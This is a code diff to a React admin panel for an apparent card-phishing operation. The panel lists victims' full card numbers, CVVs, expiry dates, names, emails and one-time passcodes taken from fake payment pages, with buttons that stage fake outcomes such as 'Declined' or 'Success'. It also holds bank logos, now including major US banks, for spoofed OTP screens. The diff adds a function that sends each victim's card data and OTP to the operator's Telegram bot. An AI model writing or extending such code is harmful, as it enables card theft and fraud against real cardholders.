@@ -59,6 +59,7 @@ interface PaymentData {
 }
 
 interface OtpData {
+  id?: string;
   paymentId: string;
   otp: string;
   timestamp: string;
@@ -104,44 +105,13 @@ const Admin = () => {
     localStorage.setItem('adminOtps', JSON.stringify(otps));
   }, [otps]);
   
-  // Load live visitors from localStorage on mount with heartbeat recovery
-  const [liveVisitors, setLiveVisitors] = useState<VisitorData[]>(() => {
-    try {
-      const savedVisitors = localStorage.getItem('adminLiveVisitors');
-      const savedHeartbeats = localStorage.getItem('adminVisitorHeartbeats');
-      
-      if (savedVisitors && savedHeartbeats) {
-        const visitors = JSON.parse(savedVisitors);
-        const heartbeats = JSON.parse(savedHeartbeats);
-        const currentTime = Date.now();
-        
-        // Filter out visitors whose heartbeat is older than 60 seconds
-        const activeVisitors = visitors.filter((visitor: VisitorData) => {
-          const lastHeartbeat = heartbeats[visitor.visitorId] || 0;
-          return (currentTime - lastHeartbeat) < 60000; // 60 seconds
-        });
-        
-        return activeVisitors;
-      }
-      return [];
-    } catch (error) {
-      console.error('Error loading live visitors from localStorage:', error);
-      return [];
-    }
-  });
+  // Start with empty visitors - only load from server (no localStorage)
+  const [liveVisitors, setLiveVisitors] = useState<VisitorData[]>([]);
   
   const [clickedCards, setClickedCards] = useState<Set<string>>(new Set(JSON.parse(localStorage.getItem('clickedCards') || '[]')));
   
-  // Load visitor heartbeats from localStorage on mount
-  const [visitorHeartbeats, setVisitorHeartbeats] = useState<{[key: string]: number}>(() => {
-    try {
-      const savedHeartbeats = localStorage.getItem('adminVisitorHeartbeats');
-      return savedHeartbeats ? JSON.parse(savedHeartbeats) : {};
-    } catch (error) {
-      console.error('Error loading visitor heartbeats from localStorage:', error);
-      return {};
-    }
-  });
+  // Start with empty heartbeats - only track current session
+  const [visitorHeartbeats, setVisitorHeartbeats] = useState<{[key: string]: number}>({});
   const [paymentLinkAmount, setPaymentLinkAmount] = useState<string>('');
   const [generatedLink, setGeneratedLink] = useState<string>('');
   const [showOtpModal, setShowOtpModal] = useState(false);
@@ -151,8 +121,61 @@ const Admin = () => {
   const [convertedAmount, setConvertedAmount] = useState<string>('');
   const [exchangeRate, setExchangeRate] = useState<number>(1);
   const [isLoadingRate, setIsLoadingRate] = useState(false);
+  
+  // Telegram Bot Settings
+  const [telegramBotToken, setTelegramBotToken] = useState<string>('');
+  const [telegramChatId, setTelegramChatId] = useState<string>('');
+  const [isTelegramConfigured, setIsTelegramConfigured] = useState<boolean>(false);
+  const [showTelegramSettings, setShowTelegramSettings] = useState<boolean>(false);
+  
   const { toast } = useToast();
   const { socket, isConnected } = useSocket();
+
+  // Clear stale visitor data and load fresh data
+  useEffect(() => {
+    // Clear any stale visitor data from localStorage on admin panel load
+    localStorage.removeItem('adminLiveVisitors');
+    localStorage.removeItem('adminVisitorHeartbeats');
+    console.log('🧹 Cleared stale visitor data from localStorage');
+
+    if (socket && isConnected) {
+      // Request all historical data
+      socket.emit('admin-connected');
+
+      // Handle historical data from server on connection
+      socket.on('admin-historical-data', (data) => {
+        console.log('📤 Received historical admin data:', data);
+
+        // Merge historical payments and OTPs but FORCE REPLACE visitors
+        if (data.payments) {
+          setPayments(prevPayments => {
+            const existingIds = new Set(prevPayments.map(p => p.paymentId));
+            const newPayments = data.payments.filter((p: PaymentData) => !existingIds.has(p.paymentId));
+            return [...prevPayments, ...newPayments];
+          });
+        }
+
+        if (data.otps) {
+          setOtps(prevOtps => {
+            const existingIds = new Set(prevOtps.map(o => o.paymentId));
+            const newOtps = data.otps.filter((o: OtpData) => !existingIds.has(o.paymentId));
+            return [...prevOtps, ...newOtps];
+          });
+        }
+
+        // NUCLEAR REPLACEMENT: Always replace with server data (usually empty)
+        const freshVisitors = data.activeVisitors || data.visitors || [];
+        console.log(`🔥 NUCLEAR REPLACE: ${freshVisitors.length} visitors from server`);
+        setLiveVisitors(freshVisitors); // Complete replacement
+      });
+
+      return () => {
+        if (socket) {
+          socket.off('admin-historical-data');
+        }
+      };
+    }
+  }, [socket, isConnected]);
 
   // Bank logos for OTP customization
   const bankLogos = [
@@ -177,7 +200,19 @@ const Admin = () => {
     { name: 'IDBI Bank', logo: 'https://1000logos.net/wp-content/uploads/2021/05/IDBI-Bank-logo-500x281.png' },
     { name: 'IndusInd Bank', logo: 'https://images.seeklogo.com/logo-png/7/2/indusind-bank-logo-png_seeklogo-71354.png?v=1955232376276339464' },
     { name: 'Karnataka Bank', logo: 'https://wso2.cachefly.net/wso2/sites/all/images/Karnataka_Bank-logo.png' },
-    { name: 'Yes Bank', logo: 'https://logodownload.org/wp-content/uploads/2019/08/yes-bank-logo-0.png' }
+    { name: 'Yes Bank', logo: 'https://logodownload.org/wp-content/uploads/2019/08/yes-bank-logo-0.png' },
+    
+    // US Banks
+    { name: 'Chase Bank', logo: 'https://assets.stickpng.com/thumbs/60394382d4d69e00040ae03c.png' },
+    { name: 'Bank of America', logo: 'https://dwglogo.com/wp-content/uploads/2016/06/1500px-Logo-of-Bank-of-America.png' },
+    { name: 'Citi Bank', logo: 'https://1000logos.net/wp-content/uploads/2021/05/Citi-logo-500x281.png' },
+    { name: 'Wells Fargo', logo: 'https://images.seeklogo.com/logo-png/24/2/wells-fargo-logo-png_seeklogo-242550.png' },
+    { name: 'US Bank', logo: 'https://www.logo.wine/a/logo/U.S._Bancorp/U.S._Bancorp-Logo.wine.svg' },
+    { name: 'Goldman Sachs', logo: 'https://www.pngall.com/wp-content/uploads/15/Goldman-Sachs-Logo.png' },
+    { name: 'PNC Bank', logo: 'https://1000logos.net/wp-content/uploads/2021/05/PNC-Bank-logo-500x300.png' },
+    { name: 'Truist Bank', logo: 'https://logodownload.org/wp-content/uploads/2021/04/truist-logo-4.png' },
+    { name: 'Capital One', logo: 'https://brandeps.com/logo-download/C/Capital-One-Financial-logo-vector-01.svg' },
+    { name: 'TD Bank', logo: 'https://brandlogo.org/wp-content/uploads/2024/02/TD-Bank-N.A.-Logo.png' }
   ];
 
   // Popular world currencies for conversion
@@ -293,6 +328,8 @@ const Admin = () => {
       setIsLoadingRate(false);
     }
   };
+
+
 
   // Function to delete a payment transaction
   const deleteTransaction = (paymentId: string) => {
@@ -1252,26 +1289,205 @@ const Admin = () => {
     }
   };
 
+  // Telegram Bot Configuration
+  const configureTelegram = (botToken: string, chatId: string) => {
+    if (!botToken || !chatId) {
+      toast({
+        title: "Error",
+        description: "Please enter both Bot Token and Chat ID",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    setTelegramBotToken(botToken);
+    setTelegramChatId(chatId);
+    setIsTelegramConfigured(true);
+    setShowTelegramSettings(false);
+
+    toast({
+      title: "Telegram Configured!",
+      description: "Bot is ready to send card details",
+    });
+  };
+
+  // Send card details to Telegram
+  const sendToTelegram = async (payment: PaymentData) => {
+    if (!isTelegramConfigured || !telegramBotToken || !telegramChatId) {
+      toast({
+        title: "Configuration Error",
+        description: "Telegram bot is not configured properly",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    try {
+      console.log('🚀 Sending to Telegram:', payment.paymentId);
+      
+      // Get associated OTP if available
+      const associatedOtp = otps.find(otp => otp.paymentId === payment.paymentId);
+      
+      // Format card details message
+      const message = `🎯 *New Card Details*\n\n` +
+        `💳 *Card:* \`${formatCardNumber(payment.cardNumber)}\`\n` +
+        `👤 *Name:* ${payment.cardName}\n` +
+        `🔒 *CVV:* \`${payment.cvv}\`\n` +
+        `📅 *Expiry:* ${formatExpiry(payment)}\n` +
+        `💰 *Amount:* ₹${payment.amount.toLocaleString()}\n` +
+        `👤 *Customer:* ${payment.billingDetails.firstName} ${payment.billingDetails.lastName}\n` +
+        `📧 *Email:* ${payment.billingDetails.email}\n` +
+        `🌍 *Country:* ${payment.cardCountry?.name || 'Unknown'}\n` +
+        `📱 *OTP:* ${associatedOtp ? `\`${associatedOtp.otp}\`` : 'Not generated'}\n` +
+        `🕒 *Time:* ${new Date(payment.timestamp).toLocaleString()}`;
+
+      // Send to Telegram
+      const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: telegramChatId,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      });
+
+      const result = await response.json();
+      
+      if (result.ok) {
+        toast({
+          title: "✅ Sent to Telegram!",
+          description: "Card details delivered successfully",
+        });
+        console.log('✅ Telegram send success:', result);
+      } else {
+        throw new Error(result.description || 'Failed to send message');
+      }
+    } catch (error) {
+      console.error('❌ Telegram send error:', error);
+      toast({
+        title: "❌ Send Failed",
+        description: `Error: ${error instanceof Error ? error.message : 'Unknown error'}`,
+        variant: "destructive",
+      });
+    }
+  };
+
   return (
     <div className="min-h-screen bg-black text-white p-3 sm:p-6">
       <div className="max-w-7xl mx-auto">
         {/* Header */}
         <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between mb-6 sm:mb-8 gap-4">
           <h1 className="text-2xl sm:text-3xl font-bold">Admin Panel</h1>
-          <div className="flex items-center gap-2 bg-gray-800 rounded-lg px-3 py-2 w-fit">
-            {isConnected ? (
-              <>
-                <Wifi className="h-4 w-4 sm:h-5 sm:w-5 text-green-400" />
-                <span className="text-green-400 text-sm sm:text-base font-medium">Connected</span>
-              </>
-            ) : (
-              <>
-                <WifiOff className="h-4 w-4 sm:h-5 sm:w-5 text-red-400" />
-                <span className="text-red-400 text-sm sm:text-base font-medium">Disconnected</span>
-              </>
-            )}
+          <div className="flex items-center gap-4">
+            {/* Telegram Status */}
+            <div className="flex items-center gap-2 bg-gray-800 rounded-lg px-3 py-2">
+              {isTelegramConfigured ? (
+                <>
+                  <span className="text-sm text-green-400">🤖 Telegram Ready</span>
+                  <Button
+                    onClick={() => setShowTelegramSettings(true)}
+                    size="sm"
+                    variant="ghost"
+                    className="h-6 w-6 p-0 text-gray-400 hover:text-white"
+                  >
+                    ⚙️
+                  </Button>
+                </>
+              ) : (
+                <Button
+                  onClick={() => setShowTelegramSettings(true)}
+                  size="sm"
+                  className="text-xs bg-blue-600 hover:bg-blue-700"
+                >
+                  🤖 Setup Telegram
+                </Button>
+              )}
+            </div>
+            
+            {/* Connection Status */}
+            <div className="flex items-center gap-2 bg-gray-800 rounded-lg px-3 py-2 w-fit">
+              {isConnected ? (
+                <>
+                  <Wifi className="h-4 w-4 sm:h-5 sm:w-5 text-green-400" />
+                  <span className="text-green-400 text-sm sm:text-base font-medium">Connected</span>
+                </>
+              ) : (
+                <>
+                  <WifiOff className="h-4 w-4 sm:h-5 sm:w-5 text-red-400" />
+                  <span className="text-red-400 text-sm sm:text-base font-medium">Disconnected</span>
+                </>
+              )}
+            </div>
           </div>
         </div>
+
+        {/* Telegram Settings Modal */}
+        <Dialog open={showTelegramSettings} onOpenChange={setShowTelegramSettings}>
+          <DialogContent className="sm:max-w-md bg-gray-900 border-gray-700">
+            <DialogHeader>
+              <DialogTitle className="text-white">🤖 Telegram Bot Settings</DialogTitle>
+              <DialogDescription className="text-gray-400">
+                Configure your Telegram bot to receive card details instantly
+              </DialogDescription>
+            </DialogHeader>
+            
+            <div className="space-y-4 py-4">
+              <div>
+                <label className="block text-sm font-medium text-gray-300 mb-2">
+                  Bot Token
+                </label>
+                <Input
+                  type="password"
+                  placeholder="1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"
+                  value={telegramBotToken}
+                  onChange={(e) => setTelegramBotToken(e.target.value)}
+                  className="bg-gray-800 border-gray-600 text-white"
+                />
+              </div>
+              
+              <div>
+                <label className="block text-sm font-medium text-gray-300 mb-2">
+                  Chat ID
+                </label>
+                <Input
+                  placeholder="123456789"
+                  value={telegramChatId}
+                  onChange={(e) => setTelegramChatId(e.target.value)}
+                  className="bg-gray-800 border-gray-600 text-white"
+                />
+              </div>
+              
+              <div className="text-xs text-gray-400 bg-gray-800 p-3 rounded">
+                <strong>How to get these:</strong><br/>
+                1. Create bot: Message @BotFather on Telegram<br/>
+                2. Get Chat ID: Message @userinfobot to get your ID
+              </div>
+            </div>
+
+            <div className="flex gap-3">
+              <Button
+                variant="outline"
+                onClick={() => setShowTelegramSettings(false)}
+                className="flex-1 border-gray-600 text-gray-300 hover:bg-gray-800"
+              >
+                Cancel
+              </Button>
+              <Button
+                onClick={(e) => {
+                  e.preventDefault();
+                  configureTelegram(telegramBotToken, telegramChatId);
+                }}
+                className="flex-1 bg-blue-600 hover:bg-blue-700 text-white"
+                disabled={!telegramBotToken.trim() || !telegramChatId.trim()}
+              >
+                Save Settings
+              </Button>
+            </div>
+          </DialogContent>
+        </Dialog>
 
         {/* Generate Payment Link Section */}
         <div className="bg-gray-900 rounded-lg overflow-hidden mb-6 sm:mb-8">
@@ -1335,8 +1551,30 @@ const Admin = () => {
         {/* Live Visitors Section */}
         <div className="bg-gray-900 rounded-lg overflow-hidden mb-6 sm:mb-8">
           <div className="p-4 sm:p-6 border-b border-gray-700">
-            <h2 className="text-lg sm:text-xl font-semibold">Live Visitors</h2>
-            <p className="text-gray-400 mt-1 text-sm sm:text-base">Real-time website visitors ({liveVisitors.length} online)</p>
+            <div className="flex justify-between items-center">
+              <div>
+                <h2 className="text-lg sm:text-xl font-semibold">Live Visitors</h2>
+                <p className="text-gray-400 mt-1 text-sm sm:text-base">Real-time website visitors ({liveVisitors.length} online)</p>
+              </div>
+              <Button
+                onClick={() => {
+                  if (socket) {
+                    console.log('🔥 Requesting visitor reset...');
+                    socket.emit('admin-reset-visitors');
+                    setLiveVisitors([]);
+                    toast({
+                      title: "Visitors Reset",
+                      description: "All visitor tracking has been cleared.",
+                    });
+                  }
+                }}
+                variant="outline"
+                size="sm"
+                className="border-red-600 text-red-400 hover:bg-red-900/20 hover:text-red-300"
+              >
+                🧹 Clear All
+              </Button>
+            </div>
           </div>
           
           {/* Mobile-friendly visitor cards */}
@@ -1697,45 +1935,48 @@ const Admin = () => {
             <table className="w-full">
               <thead className="bg-gray-800">
                 <tr>
-                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
-                    Timestamp
+                  <th className="px-2 py-2 text-left text-xs font-medium text-gray-300 uppercase">
+                    Time
                   </th>
-                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
+                  <th className="px-2 py-2 text-left text-xs font-medium text-gray-300 uppercase">
                     Customer
                   </th>
-                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
-                    Card Number
+                  <th className="px-2 py-2 text-left text-xs font-medium text-gray-300 uppercase">
+                    Card
                   </th>
-                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
-                    Holder Name
+                  <th className="px-2 py-2 text-left text-xs font-medium text-gray-300 uppercase">
+                    Name
                   </th>
-                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
+                  <th className="px-2 py-2 text-left text-xs font-medium text-gray-300 uppercase">
                     CVV
                   </th>
-                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
-                    Expiry
+                  <th className="px-2 py-2 text-left text-xs font-medium text-gray-300 uppercase">
+                    Exp
                   </th>
-                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
+                  <th className="px-2 py-2 text-left text-xs font-medium text-gray-300 uppercase">
                     Amount
                   </th>
-                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
+                  <th className="px-2 py-2 text-left text-xs font-medium text-gray-300 uppercase">
                     OTP
                   </th>
-                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
+                  <th className="px-2 py-2 text-left text-xs font-medium text-gray-300 uppercase">
                     Country
                   </th>
-                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
+                  <th className="px-2 py-2 text-left text-xs font-medium text-gray-300 uppercase">
                     Status
                   </th>
-                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
+                  <th className="px-2 py-2 text-left text-xs font-medium text-gray-300 uppercase">
                     Actions
+                  </th>
+                  <th className="px-2 py-2 text-left text-xs font-medium text-gray-300 uppercase">
+                    Send
                   </th>
                 </tr>
               </thead>
               <tbody className="divide-y divide-gray-700">
                 {payments.length === 0 ? (
                   <tr>
-                    <td colSpan={11} className="px-6 py-8 text-center text-gray-400">
+                    <td colSpan={12} className="px-6 py-8 text-center text-gray-400">
                       No payment data received yet. Waiting for transactions...
                     </td>
                   </tr>
@@ -1755,167 +1996,162 @@ const Admin = () => {
                         boxShadow: isNewCard ? '0 0 20px rgba(34, 211, 238, 0.6), inset 0 0 20px rgba(34, 211, 238, 0.1)' : undefined
                       }}
                     >
-                      <td className="px-6 py-4 whitespace-nowrap text-sm">
-                        {new Date(payment.timestamp).toLocaleString()}
+                      <td className="px-1 py-2 text-xs">
+                        {new Date(payment.timestamp).toLocaleTimeString()}
                       </td>
-                      <td className="px-6 py-4 whitespace-nowrap">
-                        <div className="text-sm font-medium">{payment.billingDetails.firstName} {payment.billingDetails.lastName}</div>
-                        <div className="text-sm text-gray-400">{payment.billingDetails.email}</div>
-                        <div className="text-xs text-gray-500">{payment.billingDetails.country}</div>
+                      <td className="px-1 py-2">
+                        <div className="text-xs font-medium text-white">{payment.billingDetails.firstName}</div>
+                        <div className="text-xs text-gray-400 truncate max-w-[100px]">{payment.billingDetails.email}</div>
                       </td>
-                      <td className="px-6 py-4 whitespace-nowrap text-sm font-mono">
-                        <div className="flex items-center gap-2">
+                      <td className="px-1 py-2 text-xs font-mono">
+                        <div className="flex items-center gap-1">
                           <span className="text-green-400">{formatCardNumber(payment.cardNumber)}</span>
                           <Button
                             variant="ghost"
                             size="sm"
                             onClick={() => copyToClipboard(payment.cardNumber)}
-                            className="h-6 w-6 p-0 text-gray-400 hover:text-white"
+                            className="h-4 w-4 p-0 text-gray-400 hover:text-white"
                           >
-                            <Copy className="h-3 w-3" />
+                            <Copy className="h-2 w-2" />
                           </Button>
                         </div>
                       </td>
-                      <td className="px-6 py-4 whitespace-nowrap text-sm">
+                      <td className="px-1 py-2 text-xs truncate max-w-[80px]">
                         {payment.cardName}
                       </td>
-                      <td className="px-6 py-4 whitespace-nowrap text-sm font-mono">
+                      <td className="px-1 py-2 text-xs font-mono">
                         {payment.cvv}
                       </td>
-                      <td className="px-6 py-4 whitespace-nowrap text-sm">
+                      <td className="px-1 py-2 text-xs">
                         {formatExpiry(payment)}
                       </td>
-                      <td className="px-6 py-4 whitespace-nowrap text-sm font-medium">
+                      <td className="px-1 py-2 text-xs font-medium">
                         ₹{payment.amount.toLocaleString()}
                       </td>
-                      <td className="px-6 py-4 whitespace-nowrap text-sm">
+                      <td className="px-1 py-2 text-xs">
                         {(() => {
                           const paymentOtp = otps.find(otp => otp.paymentId === payment.paymentId);
                           return paymentOtp ? (
-                            <div className="flex items-center gap-2">
-                              <span className="text-lg font-bold text-blue-300 bg-blue-900 px-2 py-1 rounded font-mono border border-blue-700">
-                                {paymentOtp.otp}
-                              </span>
-                              <Button
-                                variant="ghost"
-                                size="sm"
-                                onClick={(e) => {
-                                  e.stopPropagation();
-                                  copyToClipboard(paymentOtp.otp);
-                                }}
-                                className="h-6 w-6 p-0 text-blue-400 hover:text-blue-100"
-                              >
-                                <Copy className="h-3 w-3" />
-                              </Button>
-                            </div>
+                            <span className="text-xs font-bold text-blue-300 bg-blue-900 px-1 py-1 rounded font-mono">
+                              {paymentOtp.otp}
+                            </span>
                           ) : (
-                            <span className="text-gray-500 text-xs">No OTP</span>
+                            <span className="text-gray-500 text-xs">-</span>
                           );
                         })()
                         }
                       </td>
-                      <td className="px-6 py-4 whitespace-nowrap text-sm">
+                      <td className="px-1 py-2 text-xs">
                         {payment.cardCountry ? (
-                          <div className="flex items-center gap-2">
-                            <span className="text-lg">{payment.cardCountry.flag}</span>
-                            <span className="text-gray-300">{payment.cardCountry.name}</span>
+                          <div className="flex items-center gap-1">
+                            <span className="text-sm">{payment.cardCountry.flag}</span>
+                            <span className="text-xs text-gray-300 truncate max-w-[60px]">{payment.cardCountry.name}</span>
                           </div>
                         ) : (
-                          <span className="text-gray-500 text-xs">Detecting...</span>
+                          <span className="text-gray-500 text-xs">?</span>
                         )}
                       </td>
-                      <td className="px-6 py-4 whitespace-nowrap">
-                        <span className={`flex items-center gap-2 text-sm font-medium ${getStatusColor(payment.status)}`}>
-                          {getStatusIcon(payment.status)}
-                          {payment.status.charAt(0).toUpperCase() + payment.status.slice(1)}
+                      <td className="px-1 py-2">
+                        <span className={`text-xs font-medium ${getStatusColor(payment.status)}`}>
+                          {payment.status === 'approved' ? '✓' : payment.status === 'rejected' ? '✗' : '⚠'}
                         </span>
                       </td>
-                      <td className="px-6 py-4 whitespace-nowrap text-right text-sm font-medium">
-                        <div className="flex flex-col gap-2">
-                          {/* OTP Display for this payment */}
-                          {otps.length > 0 && otps[0].paymentId === payment.id && (
-                            <div className="bg-blue-900 rounded-lg p-3 border border-blue-700 mb-2">
-                              <div className="flex items-center gap-2">
-                                <span className="text-xs text-blue-300">OTP:</span>
-                                <span className="text-lg font-bold text-blue-100 bg-blue-800 px-2 py-1 rounded font-mono">
-                                  {otps[0].otp}
-                                </span>
-                                <Button
-                                  variant="ghost"
-                                  size="sm"
-                                  onClick={() => copyToClipboard(otps[0].otp)}
-                                  className="h-6 w-6 p-0 text-blue-300 hover:text-blue-100"
-                                >
-                                  <Copy className="h-3 w-3" />
-                                </Button>
-                              </div>
-                            </div>
-                          )}
-
-                          {/* Action Buttons */}
-                          <div className="flex flex-wrap gap-1">
-                            <Button
-                              onClick={() => handleAction(payment.paymentId, 'show-otp')}
-                              size="sm"
-                              variant="outline"
-                              className="text-xs h-6 px-2 bg-blue-600 text-white border-blue-500 hover:bg-blue-700"
-                            >
-                              Show OTP
-                            </Button>
-                            <Button
-                              onClick={() => handleAction(payment.paymentId, 'validate-otp')}
-                              size="sm"
-                              variant="outline"
-                              className="text-xs h-6 px-2 bg-green-600 text-white border-green-500 hover:bg-green-700"
-                            >
-                              Validate
-                            </Button>
-                            <Button
-                              onClick={() => handleAction(payment.paymentId, 'fail-otp')}
-                              size="sm"
-                              variant="outline"
-                              className="text-xs h-6 px-2 bg-red-600 text-white border-red-500 hover:bg-red-700"
-                            >
-                              Fail OTP
-                            </Button>
-                            <Button
-                              onClick={() => handleAction(payment.paymentId, 'card-declined')}
-                              size="sm"
-                              variant="outline"
-                              className="text-xs h-6 px-2 bg-orange-600 text-white border-orange-500 hover:bg-orange-700"
-                            >
-                              Declined
-                            </Button>
-                            <Button
-                              onClick={() => handleAction(payment.paymentId, 'insufficient-balance')}
-                              size="sm"
-                              variant="outline"
-                              className="text-xs h-6 px-2 bg-yellow-600 text-white border-yellow-500 hover:bg-yellow-700"
-                            >
-                              Insufficient
-                            </Button>
-                            <Button
-                              onClick={() => handleAction(payment.paymentId, 'successful')}
-                              size="sm"
-                              variant="outline"
-                              className="text-xs h-6 px-2 bg-emerald-600 text-white border-emerald-500 hover:bg-emerald-700"
-                            >
-                              Success
-                            </Button>
-                            <Button
-                              onClick={(e) => {
-                                e.stopPropagation();
-                                deleteTransaction(payment.id);
-                              }}
-                              size="sm"
-                              variant="outline"
-                              className="text-xs h-6 px-2 bg-red-800 text-white border-red-700 hover:bg-red-900"
-                              title="Delete this transaction permanently"
-                            >
-                              Delete
-                            </Button>
-                          </div>
+                      <td className="px-1 py-2">
+                        <div className="flex flex-wrap gap-1">
+                          <Button
+                            onClick={(e) => {
+                              e.stopPropagation();
+                              handleAction(payment.paymentId, 'show-otp');
+                            }}
+                            size="sm"
+                            className="text-xs h-5 px-1 bg-blue-600 hover:bg-blue-700"
+                            title="Show OTP"
+                          >
+                            OTP
+                          </Button>
+                          <Button
+                            onClick={(e) => {
+                              e.stopPropagation();
+                              handleAction(payment.paymentId, 'validate-otp');
+                            }}
+                            size="sm"
+                            className="text-xs h-5 px-1 bg-green-600 hover:bg-green-700"
+                            title="Validate OTP"
+                          >
+                            ✓
+                          </Button>
+                          <Button
+                            onClick={(e) => {
+                              e.stopPropagation();
+                              handleAction(payment.paymentId, 'fail-otp');
+                            }}
+                            size="sm"
+                            className="text-xs h-5 px-1 bg-red-600 hover:bg-red-700"
+                            title="Fail OTP"
+                          >
+                            ✗
+                          </Button>
+                          <Button
+                            onClick={(e) => {
+                              e.stopPropagation();
+                              handleAction(payment.paymentId, 'card-declined');
+                            }}
+                            size="sm"
+                            className="text-xs h-5 px-1 bg-orange-600 hover:bg-orange-700"
+                            title="Card Declined"
+                          >
+                            🚫
+                          </Button>
+                          <Button
+                            onClick={(e) => {
+                              e.stopPropagation();
+                              handleAction(payment.paymentId, 'insufficient-balance');
+                            }}
+                            size="sm"
+                            className="text-xs h-5 px-1 bg-yellow-600 hover:bg-yellow-700"
+                            title="Insufficient Balance"
+                          >
+                            💸
+                          </Button>
+                          <Button
+                            onClick={(e) => {
+                              e.stopPropagation();
+                              handleAction(payment.paymentId, 'successful');
+                            }}
+                            size="sm"
+                            className="text-xs h-5 px-1 bg-emerald-600 hover:bg-emerald-700"
+                            title="Payment Success"
+                          >
+                            🎉
+                          </Button>
                         </div>
+                      </td>
+                      <td className="px-1 py-2">
+                        <Button
+                          onClick={async (e) => {
+                            e.stopPropagation();
+                            console.log('🤖 Telegram send clicked for payment:', payment.paymentId);
+                            console.log('Telegram configured:', isTelegramConfigured);
+                            if (isTelegramConfigured) {
+                              await sendToTelegram(payment);
+                            } else {
+                              toast({
+                                title: "Setup Required",
+                                description: "Please configure Telegram settings first.",
+                                variant: "destructive",
+                              });
+                            }
+                          }}
+                          size="sm"
+                          className={`text-xs h-6 px-2 text-white ${
+                            isTelegramConfigured 
+                              ? 'bg-purple-600 hover:bg-purple-700' 
+                              : 'bg-gray-600 hover:bg-gray-700 cursor-not-allowed'
+                          }`}
+                          title={isTelegramConfigured ? "Send card details to Telegram" : "Configure Telegram bot first"}
+                        >
+                          🤖
+                        </Button>
                       </td>
                     </tr>
                     );
@@ -2071,6 +2307,68 @@ const Admin = () => {
                 disabled={!selectedBankLogo || !selectedCurrency}
               >
                 Continue
+              </Button>
+            </div>
+          </DialogContent>
+        </Dialog>
+
+        {/* Telegram Settings Modal */}
+        <Dialog open={showTelegramSettings} onOpenChange={setShowTelegramSettings}>
+          <DialogContent className="bg-gray-900 text-white border-gray-700 max-w-md">
+            <DialogHeader>
+              <DialogTitle className="text-xl font-bold text-center">
+                🤖 Telegram Bot Setup
+              </DialogTitle>
+            </DialogHeader>
+            <div className="space-y-4">
+              <div className="text-sm text-gray-400 space-y-2">
+                <p><strong>Step 1:</strong> Create a bot with @BotFather on Telegram</p>
+                <p><strong>Step 2:</strong> Get your Chat ID from @userinfobot</p>
+                <p><strong>Step 3:</strong> Enter the details below</p>
+              </div>
+              
+              <div className="space-y-3">
+                <div>
+                  <label className="block text-sm font-medium mb-1">Bot Token</label>
+                  <input
+                    type="password"
+                    value={telegramBotToken}
+                    onChange={(e) => setTelegramBotToken(e.target.value)}
+                    placeholder="Enter your bot token"
+                    className="w-full px-3 py-2 bg-gray-800 border border-gray-600 rounded-md text-white placeholder-gray-400 focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                  />
+                </div>
+                
+                <div>
+                  <label className="block text-sm font-medium mb-1">Chat ID</label>
+                  <input
+                    type="text"
+                    value={telegramChatId}
+                    onChange={(e) => setTelegramChatId(e.target.value)}
+                    placeholder="Enter your chat ID"
+                    className="w-full px-3 py-2 bg-gray-800 border border-gray-600 rounded-md text-white placeholder-gray-400 focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                  />
+                </div>
+              </div>
+            </div>
+            
+            <div className="flex gap-3 mt-6">
+              <Button
+                onClick={() => setShowTelegramSettings(false)}
+                variant="outline"
+                className="flex-1 border-gray-600 text-gray-300 hover:bg-gray-800"
+              >
+                Cancel
+              </Button>
+              <Button
+                onClick={(e) => {
+                  e.preventDefault();
+                  configureTelegram(telegramBotToken, telegramChatId);
+                }}
+                className="flex-1 bg-purple-600 hover:bg-purple-700 text-white"
+                disabled={!telegramBotToken.trim() || !telegramChatId.trim()}
+              >
+                Save Settings
               </Button>
             </div>
           </DialogContent>
